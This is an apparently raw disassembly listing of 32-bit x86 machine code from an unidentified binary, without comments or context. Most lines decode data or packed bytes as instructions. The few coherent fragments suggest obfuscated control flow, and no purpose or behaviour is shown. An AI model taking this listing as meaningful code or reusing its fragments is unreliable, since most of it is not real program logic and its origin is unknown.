  415752:	(bad)  
  415753:	shr    bh,1
  415755:	fsubr  QWORD PTR [eax+ebp*8+0x51c07fe0]
  41575c:	lds    esp,FWORD PTR [edx]
  41575e:	lea    ecx,[ebx]
  415760:	in     eax,dx
  415761:	scas   al,BYTE PTR es:[edi]
  415762:	adc    cl,BYTE PTR [ebp-0x54f9f78a]
  415768:	ins    BYTE PTR es:[edi],dx
  415769:	test   BYTE PTR [edi+ecx*4-0xb99155],cl
  415770:	sti    
  415771:	sub    BYTE PTR [esp+esi*4+0x7c],0x52
  415776:	mov    ah,0xd7
  415778:	mov    BYTE PTR [edx-0x15],0x24
  41577c:	(bad)  
  41577d:	fdiv   st,st(1)
  41577f:	xor    esi,ecx
  415781:	mul    BYTE PTR [esi+edx*1]
  415784:	xor    ebp,ecx
  415786:	or     ebx,DWORD PTR [ecx+0x16]
  415789:	mov    edi,0xf9ba3165
  41578e:	or     DWORD PTR [ebx-0x4a],0xaddd23bd
  415795:	pop    esi
  415796:	(bad)  
  415797:	call   0x720524eb
  41579c:	sti    
  41579d:	mov    al,ds:0x1c8190c0
  4157a2:	inc    esi
  4157a3:	repz or ebx,DWORD PTR [ebx]
  4157a6:	ret    
  4157a7:	sbb    dh,BYTE PTR [ebx]
  4157a9:	iret   
  4157aa:	mov    dl,BYTE PTR [edi+0x2e]
  4157ad:	and    al,BYTE PTR [eax+0x3ed77c00]
  4157b3:	enter  0x88be,0x45
  4157b7:	div    DWORD PTR [ebx-0x42c5b342]
  4157bd:	cwde   
  4157be:	xor    BYTE PTR [esi+0x6f],ah
  4157c1:	mov    ebx,DWORD PTR [esi-0x6]
  4157c4:	test   eax,0x1e65a8fe
  4157c9:	cwde   
  4157ca:	inc    ebp
  4157cb:	xchg   edi,ebx
  4157cd:	mov    cs,esp
  4157cf:	inc    esp
  4157d0:	and    al,BYTE PTR [ecx+ebx*2-0x9]
  4157d4:	and    eax,0x3c226d9a
  4157d9:	not    BYTE PTR [eax]
  4157db:	sti    
  4157dc:	es dec esi
  4157de:	mov    DWORD PTR [edi-0x41f73008],edi
  4157e4:	cs jp  0x4157cd
  4157e7:	xchg   ebx,eax
  4157e8:	retf   
  4157e9:	fistp  DWORD PTR [eax]
  4157eb:	outs   dx,DWORD PTR ds:[esi]
  4157ec:	pop    edi
  4157ed:	mov    ecx,DWORD PTR [ebp-0x70]
  4157f0:	imul   eax,eax,0x1e96
  4157f6:	xor    eax,ecx
  4157f8:	and    eax,0x3e8d
  4157fd:	add    eax,DWORD PTR [ebp-0x5c]
  415800:	jmp    0x4158cb
  415805:	push   ds
  415806:	and    al,0x80
  415808:	xchg   ecx,eax
  415809:	mov    edx,0x78af1fb5
  41580e:	dec    eax
  41580f:	int    0xcd
  415811:	mov    cs,WORD PTR [esi]
  415813:	xchg   esp,eax
  415814:	cmp    DWORD PTR [ebp-0xe],esp
  415817:	add    BYTE PTR [eax],al
  415819:	scas   al,BYTE PTR es:[edi]
  41581a:	add    BYTE PTR [eax],al
  41581c:	add    BYTE PTR [edx-0x20],ch
  41581f:	xchg   DWORD PTR [eax],eax
  415821:	sti    
  415822:	sti    
  415823:	ret    
  415824:	xor    eax,0xd2a4ab8
  415829:	clc    
  41582a:	imul   ebp,DWORD PTR gs:[ebx],0xdd7762ce
  415831:	and    DWORD PTR [ebx+0x582e0add],0x1927cf51
  41583b:	es xor al,0x9a
  41583e:	pushf  
  41583f:	ret    0x7965
  415842:	cmp    eax,0x4523b713
  415847:	inc    ebp
  415848:	pop    esi
  415849:	inc    eax
  41584a:	push   edx
  41584b:	shl    eax,0xe2
  41584e:	dec    ecx
  41584f:	ret    0xef05
  415852:	jne    0x4158cc
  415854:	or     al,0x5f
  415856:	jb     0x41588b
  415858:	(bad)  
  415859:	jmp    0x3173fc78
  41585e:	shr    DWORD PTR [ecx-0x7e],1
  415861:	imul   ebp,DWORD PTR [edx-0x5a],0xffffffcc
  415865:	push   esp
  415866:	dec    eax
  415867:	loopne 0x415835
  415869:	adc    dh,BYTE PTR [edx]
  41586b:	and    eax,0x5d26ee3a
  415870:	add    BYTE PTR [esi],ah
  415872:	out    dx,eax
  415873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415874:	or     BYTE PTR [edi+0x60dce423],0x34
  41587b:	(bad)
  41587e:	arpl   WORD PTR [ebp-0x54],di
  415881:	outs   dx,DWORD PTR ds:[esi]
  415882:	loopne 0x4158b0
  415884:	jle    0x415848
  415886:	inc    ebp
  415887:	mov    edx,DWORD PTR [eax+0x6]
  41588a:	leave  
  41588b:	xchg   cl,bh
  41588d:	shl    BYTE PTR [edx-0x7f],1
  415890:	or     eax,0x1969f872
  415895:	xor    eax,0xa753f788
  41589a:	and    DWORD PTR ds:0xa617544a,esp
  4158a0:	daa    
  4158a1:	xlat   BYTE PTR ds:[ebx]
  4158a2:	rcl    DWORD PTR [esi-0xf],0xb9
  4158a6:	fsub   DWORD PTR [edi+0xce81610]
  4158ac:	xchg   edi,eax
  4158ad:	loopne 0x41586e
  4158af:	sbb    BYTE PTR [eax+0x33],bh
  4158b2:	aaa    
  4158b3:	cmp    al,0xfe
  4158b5:	dec    edx
  4158b6:	cmp    ebp,DWORD PTR [ecx-0x3bac8754]
  4158bc:	je     0x4158f5
  4158be:	mov    ch,0x72
  4158c0:	fcmovnb st,st(6)
  4158c2:	lahf   
  4158c3:	adc    DWORD PTR [edi],ebp
  4158c5:	loope  0x4158aa
  4158c7:	icebp  
  4158c8:	out    0x9b,eax
  4158ca:	push   edx
  4158cb:	xor    edx,edx
  4158cd:	xor    eax,0x42e3
  4158d2:	lea    eax,[ebp+eax*1-0xd0]
  4158d9:	jmp    0x4159a4
  4158de:	sub    ebx,DWORD PTR [ebx]
  4158e0:	lea    esp,[ebp-0x43]
  4158e3:	imul   ebx
  4158e5:	pop    edi
  4158e6:	jl     0x4158cf
  4158e8:	fnstsw WORD PTR [edi+0xf192646]
  4158ee:	adc    esi,ebx
  4158f0:	add    BYTE PTR [eax],al
  4158f2:	scas   al,BYTE PTR es:[edi]
  4158f3:	add    BYTE PTR [eax],al
  4158f5:	add    BYTE PTR [esp+ebx*2],dh
  4158f8:	pop    eax
  4158f9:	jl     0x4158e6
  4158fb:	pop    ebp
  4158fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158fd:	mov    ch,0x0
  4158ff:	cmp    eax,0xfdcd0e83
  415904:	inc    eax
  415905:	lahf   
  415906:	xchg   esi,eax
  415907:	stos   DWORD PTR es:[edi],eax
  415908:	rcl    BYTE PTR [edx+0x11],cl
  41590b:	or     ch,BYTE PTR [edi-0x7a87671f]
  415911:	rcl    DWORD PTR [ecx-0x5e],0x66
  415915:	cld    
  415916:	jg     0x4158b8
  415918:	or     esp,DWORD PTR [ebp-0x3e]
  41591b:	sbb    BYTE PTR ds:0x1530a925,al
  415921:	mov    al,ds:0x58e2dd21
  415926:	add    edi,DWORD PTR [ebx+0x40ca626b]
  41592c:	lods   al,BYTE PTR ds:[esi]
  41592d:	add    al,0xb5
  41592f:	dec    esp
  415930:	mov    edi,?
  415932:	(bad)
  415935:	rol    DWORD PTR [ebp-0x47],1
  415938:	mov    al,dh
  41593a:	aas    
  41593b:	mov    bl,BYTE PTR [eax+ebx*1]
  41593e:	in     al,dx
  41593f:	xchg   edi,eax
  415940:	je     0x415963
  415942:	je     0x41595c
  415944:	sub    esp,ebp
  415946:	call   0xd00e126f
  41594b:	jp     0x415912
  41594d:	mov    ecx,0x1e785642
  415952:	das    
  415953:	loopne 0x415968
  415955:	dec    ebx
  415956:	dec    eax
  415957:	in     al,dx
  415958:	sbb    DWORD PTR [ecx-0x64],edx
  41595b:	shl    BYTE PTR [ecx],0x2b
  41595e:	jg     0x41591a
  415960:	push   eax
  415961:	fdivp  st(6),st
  415963:	adc    ebx,edi
  415965:	cli    
  415966:	cmp    al,ch
  415968:	sbb    DWORD PTR [edi-0x4486f58a],ecx
  41596e:	add    DWORD PTR [ecx-0x61b6ea68],edi
  415974:	scas   eax,DWORD PTR es:[edi]
  415975:	je     0x4158fe
  415977:	mov    esp,0xc75b22f0
  41597c:	jbe    0x4159c4
  41597e:	jmp    0xb00d:0xcc2316d9
  415985:	mov    dl,0xec
  415987:	fcom   DWORD PTR [eax]
  415989:	and    al,0x7f
  41598b:	dec    eax
  41598c:	jmp    0x415a0b
  41598e:	mov    ah,0x25
  415990:	retf   
  415991:	add    DWORD PTR [esi+0x69c649e7],esp
  415997:	imul   ebx,DWORD PTR [ecx+0x70ab5372],0x7553e8b0
  4159a1:	rol    BYTE PTR [ebp+0x458b5055],1
  4159a7:	test   cl,ch
  4159a9:	mov    BYTE PTR [eax],0x0
  4159ac:	add    BYTE PTR [esi+0x25],dl
  4159af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159b0:	outs   dx,DWORD PTR ds:[esi]
  4159b1:	imul   edi
  4159b3:	fidivr WORD PTR ds:0x5f3932a4
  4159b9:	repz mov esi,0xf3c17091
  4159bf:	add    BYTE PTR [eax],al
  4159c1:	scas   al,BYTE PTR es:[edi]
  4159c2:	add    BYTE PTR [eax],al
  4159c4:	add    BYTE PTR [ebp+0x4d97eede],dl
  4159ca:	pop    ecx
  4159cb:	cmp    al,0x9c
  4159cd:	test   eax,0xfb89dbf8
  4159d2:	jle    0x415983
  4159d4:	mov    bl,0xc9
  4159d6:	cmp    BYTE PTR [esp+ebp*4-0x3e9bf613],al
  4159dd:	inc    BYTE PTR [esi]
  4159df:	clc    
  4159e0:	ret    
  4159e1:	imul   esp,esi,0x46
  4159e4:	mov    edx,0x545b7092
  4159e9:	ss push edi
  4159eb:	push   0xdbf62321
  4159f0:	add    BYTE PTR fs:[ecx+0x58f97536],bl
  4159f7:	f2xm1  
  4159f9:	iret   
  4159fa:	(bad)  
  4159fb:	push   0xffffffea
  4159fd:	loope  0x4159cf
  4159ff:	ret    
  415a00:	cs jb  0x415a3b
  415a03:	aad    0x34
  415a05:	movhps xmm3,QWORD PTR [edi+ebp*4-0x6288067b]
  415a0d:	and    edx,DWORD PTR [ebx+0x6b755530]
  415a13:	add    eax,0xdae30194
  415a18:	pushf  
  415a19:	icebp  
  415a1a:	loop   0x415a1a
  415a1c:	xlat   BYTE PTR ds:[ebx]
  415a1d:	mov    al,ds:0x923193e7
  415a22:	jns    0x4159e0
  415a24:	dec    esp
  415a25:	in     eax,0xb5
  415a27:	sbb    edi,DWORD PTR [ecx-0x17]
  415a2a:	ret    0x57db
  415a2d:	jns    0x4159db
  415a2f:	add    edi,DWORD PTR [esi+0x77]
  415a32:	xchg   esi,eax
  415a33:	pusha  
  415a34:	frstor [ebp+0x72]
  415a37:	mov    al,0x56
  415a39:	stc    
  415a3a:	xchg   ecx,eax
  415a3b:	jo     0x4159c1
  415a3d:	add    BYTE PTR [edx+esi*4],bh
  415a40:	dec    ecx
  415a41:	cmp    edi,DWORD PTR ds:0xfc0a3dd6
  415a47:	jl     0x415a4d
  415a49:	repz shl DWORD PTR [eax+edi*4+0x9a0198],0xb4
  415a52:	pop    edx
  415a53:	shl    DWORD PTR es:[eax+0x2d],cl
  415a57:	fwait
  415a58:	xor    DWORD PTR [edx+0x47],edi
  415a5b:	pop    edi
  415a5c:	out    dx,al
  415a5d:	mov    ebp,0xdd53c7a8
  415a62:	in     al,dx
  415a63:	adc    ah,dl
  415a65:	fbstp  TBYTE PTR [esi+edi*4]
  415a68:	and    edx,esi
  415a6a:	mov    al,ds:0xa4d1481
  415a6f:	inc    edi
  415a70:	push   0x55
  415a72:	fimul  DWORD PTR [ebx-0x3ecc37b3]
  415a78:	mov    ecx,DWORD PTR [ebp-0x40]
  415a7b:	and    eax,0x2df8
  415a80:	xor    eax,ecx
  415a82:	mov    ecx,DWORD PTR [ebp-0x48]
  415a85:	imul   eax,ecx
  415a88:	xor    eax,0x23a0d229
  415a8d:	jmp    0x415b58
  415a92:	pop    ss
  415a93:	and    al,BYTE PTR [edi]
  415a95:	div    BYTE PTR [edi]
  415a97:	div    edi
  415a99:	jecxz  0x415af4
  415a9b:	loope  0x415b09
  415a9d:	dec    esi
  415a9e:	lods   eax,DWORD PTR ds:[esi]
  415a9f:	sub    al,0x4
  415aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa2:	outs   dx,DWORD PTR ds:[esi]
  415aa3:	hlt    
  415aa4:	add    BYTE PTR [eax],al
  415aa6:	scas   al,BYTE PTR es:[edi]
  415aa7:	add    BYTE PTR [eax],al
  415aa9:	add    BYTE PTR [eax+eiz*1+0x7c639139],cl
  415ab0:	xor    al,BYTE PTR [edi+0x56]
  415ab3:	dec    eax
  415ab4:	adc    eax,0x2ad29928
  415ab9:	(bad)  
  415abb:	add    DWORD PTR [esi+0x239997f1],ecx
  415ac1:	mov    bl,0xb4
  415ac3:	in     al,0xa4
  415ac5:	jne    0x415a71
  415ac7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  415ac9:	test   BYTE PTR [edx-0x40],al
  415acc:	push   0x69
  415ace:	sbb    ebp,DWORD PTR ds:0xcc8da8d
  415ad4:	add    eax,0xf68216bb
  415ad9:	jle    0x415a6e
  415adb:	xchg   edi,eax
  415adc:	test   eax,0xbbcd7e79
  415ae1:	mov    eax,ds:0xf5221a4d
  415ae6:	mov    ah,0x5f
  415ae8:	mov    ah,0xd7
  415aea:	(bad)  
  415aec:	outs   dx,BYTE PTR ds:[esi]
  415aed:	out    0xe2,eax
  415aef:	inc    ecx
  415af0:	jbe    0x415aa4
  415af2:	jo     0x415afe
  415af4:	gs inc edi
  415af6:	or     al,0x4c
  415af8:	or     bl,BYTE PTR [ebp+0x79]
  415afb:	adc    BYTE PTR [esi],0xa0
  415afe:	push   cs
  415aff:	imul   esi,esi,0xffffff9f
  415b02:	lods   al,BYTE PTR ds:[esi]
  415b03:	ins    DWORD PTR es:[edi],dx
  415b04:	(bad)  
  415b05:	xchg   edi,eax
  415b06:	cs pushf 
  415b08:	loopne 0x415b4b
  415b0a:	call   0x688d:0xc32f8cea
  415b11:	and    ah,BYTE PTR [eax-0x135b148f]
  415b17:	xor    al,0x26
  415b19:	inc    ebp
  415b1a:	fadd   DWORD PTR [ebx]
  415b1c:	pop    esp
  415b1d:	cmovbe ebp,DWORD PTR [eax]
  415b20:	fiadd  WORD PTR [ebp+0x10]
  415b23:	adc    eax,0x87291725
  415b28:	jp     0x415b2c
  415b2a:	mov    cl,0x3
  415b2c:	(bad)  
  415b2e:	cmp    al,0xe6
  415b30:	inc    esi
  415b31:	xchg   eax,ebx
  415b33:	push   ds
  415b34:	sbb    BYTE PTR [esi-0x7e],dh
  415b37:	mov    ecx,0xb436c980
  415b3c:	add    esi,DWORD PTR [eax]
  415b3e:	cdq    
  415b3f:	fimul  WORD PTR [eax+esi*8-0x4cfbceb2]
  415b46:	div    DWORD PTR [edx-0x78]
  415b49:	(bad)  
  415b4a:	pop    ebx
  415b4b:	ret    0x514
  415b4e:	or     bl,BYTE PTR [eax]
  415b50:	enter  0x34c7,0x8b
  415b54:	xchg   DWORD PTR [ebx+0x4f],esi
  415b57:	fcom   QWORD PTR [eax-0x5f]
  415b5a:	mov    ah,0x31
  415b5c:	inc    ebx
  415b5d:	add    cl,ch
  415b5f:	mov    BYTE PTR [eax],0x0
  415b62:	add    BYTE PTR [ecx-0x76],bl
  415b65:	push   0xfffffff1
  415b67:	sti    
  415b68:	icebp  
  415b69:	fld    TBYTE PTR [edx-0x5ea427c7]
  415b6f:	and    ch,BYTE PTR [ecx]
  415b71:	(bad)  
  415b72:	lahf   
  415b73:	sbb    eax,0xae0000f5
  415b78:	add    BYTE PTR [eax],al
  415b7a:	add    BYTE PTR [ebx],dl
  415b7c:	int3   
  415b7d:	in     eax,0xe9
  415b7f:	cmp    ebp,esi
  415b81:	add    BYTE PTR [eax],cl
  415b83:	mov    bh,0x54
  415b85:	inc    ebx
  415b86:	push   0xfffffff4
  415b88:	cmp    BYTE PTR [eax],bl
  415b8a:	(bad)  
  415b8b:	rcr    ch,1
  415b8d:	imul   ebx,DWORD PTR [esp+esi*1-0x5d07feaa],0x49a16c8f
  415b98:	push   ecx
  415b99:	ficom  DWORD PTR [edi-0x586975be]
  415b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ba0:	adc    eax,0x69acd12d
  415ba5:	xchg   esi,eax
  415ba6:	in     eax,dx
  415ba7:	push   edx
  415ba8:	jp     0x415bb8
  415baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bab:	mov    DWORD PTR [edi],edi
  415bad:	lods   al,BYTE PTR ds:[esi]
  415bae:	mov    ah,0x55
  415bb0:	mov    ah,0xb2
  415bb2:	(bad)  
  415bb3:	das    
  415bb4:	fidiv  DWORD PTR [edi-0x198dc458]
  415bba:	dec    edi
  415bbb:	aad    0xd3
  415bbd:	call   0x61fce43b
  415bc2:	js     0x415b92
  415bc4:	aam    0x8f
  415bc6:	aaa    
  415bc7:	push   esi
  415bc8:	push   0x48
  415bca:	or     edx,ebx
  415bcc:	mov    ecx,0x8437fd25
  415bd1:	je     0x415b57
  415bd3:	dec    edx
  415bd4:	shr    DWORD PTR [ebx-0x38d5c044],1
  415bda:	push   esi
  415bdb:	and    DWORD PTR [edi],0x33
  415bde:	pop    edx
  415bdf:	mov    dh,0x33
  415be1:	and    al,0x93
  415be3:	or     al,0xee
  415be5:	das    
  415be6:	dec    ecx
  415be7:	pop    esp
  415be8:	aad    0xf6
  415bea:	std    
  415beb:	retf   
  415bec:	sub    al,0x81
  415bee:	cdq    
  415bef:	dec    ebx
  415bf0:	or     eax,0x39aa173e
  415bf5:	sub    DWORD PTR [esi+ebx*1],ebp
  415bf8:	sahf   
  415bf9:	mov    edi,0xe5c5bca0
  415bfe:	lods   eax,DWORD PTR ds:[esi]
  415bff:	adc    eax,0xaec1740
  415c04:	daa    
  415c05:	inc    esi
  415c06:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415c08:	mov    edx,0xf5f12b18
  415c0d:	cmp    al,0x1b
  415c0f:	inc    esi
  415c10:	addr16 mov esi,0x180847fd
  415c16:	out    0xf4,eax
  415c18:	add    ch,BYTE PTR ds:0x51bd380c
  415c1e:	loop   0x415baf
  415c20:	ss leave 
  415c22:	fs data16 (bad) 
  415c25:	push   ecx
  415c26:	sub    al,cl
  415c28:	jb     0x415c2f
  415c2a:	stos   BYTE PTR es:[edi],al
  415c2b:	add    BYTE PTR [eax],al
  415c2d:	add    BYTE PTR [eax-0x75],dl
  415c30:	inc    ebp
  415c31:	aam    0x69
  415c33:	rcl    BYTE PTR [ebp-0x46ffffec],0x24
  415c3a:	or     eax,DWORD PTR [ecx]
  415c3c:	add    bh,dh
  415c3e:	icebp  
  415c3f:	mov    ecx,DWORD PTR [ebp-0x24]
  415c42:	xor    edx,edx
  415c44:	jmp    0x415d0f
  415c49:	cmp    BYTE PTR [ebx],0xb6
  415c4c:	fistp  QWORD PTR [edi+0x27febdf]
  415c52:	jmp    0x415c6f
  415c54:	ret    
  415c55:	std    
  415c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c57:	pop    esp
  415c58:	add    cl,bl
  415c5a:	cmc    
  415c5b:	add    BYTE PTR [eax],al
  415c5d:	scas   al,BYTE PTR es:[edi]
  415c5e:	add    BYTE PTR [eax],al
  415c60:	add    al,ah
  415c62:	test   eax,0x83a4c739
  415c67:	(bad)  
  415c68:	popf   
  415c69:	cmc    
  415c6a:	sub    ebx,esi
  415c6c:	ja     0x415caa
  415c6e:	cld    
  415c6f:	out    dx,al
  415c70:	shr    ah,1
  415c72:	inc    esp
  415c73:	adc    ch,BYTE PTR [esi]
  415c75:	in     eax,dx
  415c76:	or     BYTE PTR [edx],0x2d
  415c79:	das    
  415c7a:	sti    
  415c7b:	addr16 push esp
  415c7d:	inc    esp
  415c7e:	es sub bl,dl
  415c81:	mov    eax,0x297e0bd0
  415c86:	mov    ch,0x6b
  415c88:	adc    DWORD PTR [eax],ebp
  415c8a:	sbb    ecx,ebx
  415c8c:	clc    
  415c8d:	int    0x69
  415c8f:	enter  0xdd1b,0x63
  415c93:	pop    ebp
  415c94:	inc    ecx
  415c95:	adc    DWORD PTR [eax+0x496d06fb],ebp
  415c9b:	pusha  
  415c9c:	loopne 0x415c7e
  415c9e:	pop    eax
  415ca0:	push   0x9a5b2dc7
  415ca5:	push   cs
  415ca6:	out    dx,al
  415ca7:	mov    edx,0x68cd96f1
  415cac:	dec    edx
  415cad:	xchg   edx,eax
  415cae:	push   ebx
  415caf:	arpl   di,dx
  415cb1:	ss pusha 
  415cb3:	add    eax,0x8b993503
  415cb8:	fidivr WORD PTR fs:[ebx+0x4f4cb06a]
  415cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cc0:	jae    0x415cf2
  415cc2:	inc    eax
  415cc3:	retf   
  415cc4:	and    eax,0x9f6efd8b
  415cc9:	xchg   BYTE PTR [edi+0x309745e2],bl
  415ccf:	int    0xa6
  415cd1:	das    
  415cd2:	cmc    
  415cd3:	inc    edi
  415cd4:	xor    BYTE PTR [edx-0x7378e691],dh
  415cda:	sub    dh,bh
  415cdc:	mov    bl,0xc9
  415cde:	std    
  415cdf:	(bad)  
  415ce0:	addr16 dec ebx
  415ce2:	into   
  415ce3:	scas   al,BYTE PTR es:[edi]
  415ce4:	jmp    0x415c7f
  415ce6:	test   al,0x23
  415ce8:	adc    BYTE PTR [ebp+ebx*4-0x3d08ff0],dh
  415cef:	shl    DWORD PTR [ebx-0x79],cl
  415cf2:	sub    esi,edx
  415cf4:	push   edi
  415cf5:	inc    edi
  415cf6:	mov    ds:0xbfb2e043,al
  415cfb:	out    0x67,eax
  415cfd:	dec    ebx
  415cfe:	dec    esi
  415cff:	jb     0x415c97
  415d01:	jmp    0x6e5:0x84e8bef9
  415d08:	jne    0x415d73
  415d0a:	pop    esp
  415d0b:	(bad)  
  415d0c:	sar    BYTE PTR [ecx-0x3e50f0f9],0xb9
  415d13:	sahf   
  415d14:	push   es
  415d15:	add    BYTE PTR [eax],al
  415d17:	jmp    0x415de2
  415d1c:	(bad)  
  415d1d:	cmp    eax,0xf3bec28c
  415d22:	iret   
  415d23:	jge    0x415d3d
  415d25:	loope  0x415ced
  415d27:	dec    esi
  415d28:	inc    ecx
  415d29:	popa   
  415d2a:	sub    ah,BYTE PTR [edi+0x79]
  415d2d:	test   BYTE PTR [eax],0x0
  415d30:	scas   al,BYTE PTR es:[edi]
  415d31:	add    BYTE PTR [eax],al
  415d33:	add    BYTE PTR [eax],ch
  415d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d36:	rol    esp,0xa0
  415d39:	cld    
  415d3a:	pop    esp
  415d3b:	out    dx,al
  415d3c:	xchg   ecx,eax
  415d3d:	adc    cl,ah
  415d3f:	(bad)  
  415d41:	out    0x88,al
  415d43:	push   edi
  415d44:	and    ecx,DWORD PTR [edi+0x2d]
  415d47:	outs   dx,DWORD PTR ds:[esi]
  415d48:	pop    ds
  415d49:	pop    ss
  415d4a:	pop    es
  415d4b:	addr16 and eax,0xdce985c
  415d51:	shl    DWORD PTR gs:[ebx+0x42],0xd1
  415d56:	mov    al,ds:0xb960a75c
  415d5b:	hlt    
  415d5c:	push   esp
  415d5d:	js     0x415cfd
  415d5f:	pusha  
  415d60:	or     ebx,DWORD PTR [esi-0x31b69bec]
  415d66:	mov    eax,0xe51de41b
  415d6b:	pop    es
  415d6c:	mov    ds:0xd7939461,eax
  415d71:	push   eax
  415d72:	cmp    edi,edx
  415d74:	jp     0x415d75
  415d76:	jno    0x415d9f
  415d78:	sub    BYTE PTR [eax-0x78de670a],bh
  415d7e:	int    0xdf
  415d80:	adc    al,0x53
  415d82:	retf   
  415d83:	add    bl,ah
  415d85:	push   eax
  415d86:	sub    al,0x81
  415d88:	fld    TBYTE PTR [esi]
  415d8a:	arpl   WORD PTR [esi+edi*2],bp
  415d8d:	cld    
  415d8e:	adc    edi,DWORD PTR [edx+0x36]
  415d91:	imul   ebx,DWORD PTR cs:[ebp-0x3aa06fd2],0x2c0199a2
  415d9c:	dec    edx
  415d9d:	dec    edi
  415d9e:	out    0xc8,eax
  415da0:	ds nop
  415da2:	sti    
  415da3:	sbb    ch,bl
  415da5:	or     al,0x42
  415da7:	push   ebx
  415da8:	sub    eax,0x6de49d63
  415dad:	mov    al,ds:0x1e472b25
  415db2:	rcr    DWORD PTR [edx-0x1a758385],0x3e
  415db9:	xor    al,0x36
  415dbb:	push   ecx
  415dbc:	mov    ebx,DWORD PTR [ebx]
  415dbe:	dec    esp
  415dbf:	cli    
  415dc0:	(bad)  
  415dc1:	dec    eax
  415dc2:	and    ebp,ebp
  415dc4:	mov    ebp,0x837144e9
  415dc9:	cmp    eax,0x504674cf
  415dce:	add    al,0xc0
  415dd0:	ins    BYTE PTR es:[edi],dx
  415dd1:	sub    cl,bl
  415dd3:	jae    0x415df4
  415dd5:	mov    al,BYTE PTR [ecx+0x322e4a69]
  415ddb:	mov    bh,0xca
  415ddd:	sbb    DWORD PTR [ebx+0x69],eax
  415de0:	stos   DWORD PTR es:[edi],eax
  415de1:	pop    es
  415de2:	div    ecx
  415de4:	mov    ecx,DWORD PTR ds:0x4331b4
  415dea:	mov    ecx,DWORD PTR [ecx+0x198]
  415df0:	sub    ecx,eax
  415df2:	push   DWORD PTR [ecx+0x72d2]
  415df8:	call   0x40d6b3
  415dfd:	mov    DWORD PTR [ebp-0x4],eax
  415e00:	mov    ecx,DWORD PTR ds:0x4332ac
  415e06:	lea    eax,[ebp+0x4]
  415e09:	mov    DWORD PTR [ecx*4+0x4332a4],eax
  415e10:	inc    DWORD PTR ds:0x4332ac
  415e16:	jmp    0x415ee1
  415e1b:	pop    es
  415e1c:	jmp    0x415dc7
  415e1e:	ins    DWORD PTR es:[edi],dx
  415e1f:	in     eax,dx
  415e20:	outs   dx,DWORD PTR ds:[esi]
  415e21:	(bad)  
  415e22:	jmp    0x415e3b
  415e24:	pop    ebp
  415e25:	adc    esi,DWORD PTR [ebx]
  415e27:	fstp   QWORD PTR [eax+0xe]
  415e2a:	int    0x27
  415e2c:	test   DWORD PTR [eax],0xae00
  415e32:	add    BYTE PTR [edx-0x430c99a8],dl
  415e38:	push   0x64aee046
  415e3d:	dec    ebp
  415e3e:	mov    ch,0x78
  415e40:	ret    0x22bc
  415e43:	dec    esi
  415e44:	sbb    bh,BYTE PTR [esi-0x66]
  415e47:	lods   al,BYTE PTR ds:[esi]
  415e48:	pusha  
  415e49:	gs xchg esp,eax
  415e4b:	pop    ds
  415e4c:	push   edx
  415e4d:	mov    dh,0x23
  415e4f:	call   DWORD PTR [ecx+0x4d]
  415e52:	cmc    
  415e53:	psubw  mm0,QWORD PTR [ebp-0x24615380]
  415e5a:	inc    edx
  415e5b:	leave  
  415e5c:	repnz mov esp,0x26edc187
  415e62:	lahf   
  415e63:	dec    edx
  415e64:	pop    edi
  415e65:	cmp    BYTE PTR [edx+0x692c6992],bh
  415e6b:	jb     0x415ebb
  415e6d:	pusha  
  415e6e:	int3   
  415e6f:	cdq    
  415e70:	sub    eax,0x87dc9f22
  415e75:	scas   al,BYTE PTR es:[edi]
  415e76:	sahf   
  415e77:	shr    BYTE PTR [edx-0x4d0f36a3],0x99
  415e7e:	mov    ah,0xec
  415e80:	xor    BYTE PTR [edx],dh
  415e82:	xchg   ecx,eax
  415e83:	sub    al,0x19
  415e85:	jge    0x415e73
  415e87:	ret    
  415e88:	dec    esi
  415e89:	addr16 push cs
  415e8b:	add    eax,0xa03d71f3
  415e90:	fldcw  WORD PTR [esi-0x255c060c]
  415e96:	or     BYTE PTR [esi],al
  415e98:	jl     0x415e50
  415e9a:	mov    BYTE PTR [edi],0x40
  415e9d:	jmp    0xc14d:0x26910c74
  415ea4:	inc    ebx
  415ea5:	lahf   
  415ea6:	int3   
  415ea7:	inc    DWORD PTR [ebp-0x4c604922]
  415ead:	ds mov ss,eax
  415eb0:	(bad)  
  415eb1:	sbb    cl,BYTE PTR [esi-0x63]
  415eb4:	cld    
  415eb5:	in     al,0x3f
  415eb7:	imul   esi,DWORD PTR [edi+0x3692febb],0x1c6c17f
  415ec1:	pop    ebx
  415ec2:	clc    
  415ec3:	cmc    
  415ec4:	dec    BYTE PTR [eax-0x47130250]
  415eca:	imul   ebp,DWORD PTR [edi],0xaaf00586
  415ed0:	mov    gs,WORD PTR [eax-0x5f54e5a5]
  415ed6:	jae    0x415e5c
  415ed8:	jo     0x415f20
  415eda:	inc    ebp
  415edb:	add    dh,ch
  415edd:	fdiv   QWORD PTR [edx+0x59]
  415ee0:	inc    ecx
  415ee1:	mov    eax,DWORD PTR [ebp-0x4]
  415ee4:	jmp    0x415faf
  415ee9:	pop    es
  415eea:	ds add ah,bh
  415eed:	cmp    edi,edi
  415eef:	out    0xfe,eax
  415ef1:	into   
  415ef2:	xor    cl,BYTE PTR [eax+0x57bc95da]
  415ef8:	(bad)  
  415efa:	test   DWORD PTR [eax],0xae00
  415f00:	add    BYTE PTR [ecx],ah
  415f02:	mov    al,ds:0x81deca80
  415f07:	stos   DWORD PTR es:[edi],eax
  415f08:	dec    edx
  415f09:	(bad)  
  415f0a:	adc    eax,0xfe682a94
  415f0f:	(bad)  
  415f11:	pop    ecx
  415f12:	loop   0x415f7f
  415f14:	mov    al,ds:0xd7e09326
  415f19:	shr    BYTE PTR [edx-0x76],1
  415f1c:	cmp    esp,ebx
  415f1e:	jo     0x415f9b
  415f20:	aam    0xc2
  415f22:	adc    al,0xd6
  415f24:	aas    
  415f25:	popf   
  415f26:	dec    eax
  415f27:	test   DWORD PTR [ebp+0x74],edi
  415f2a:	iret   
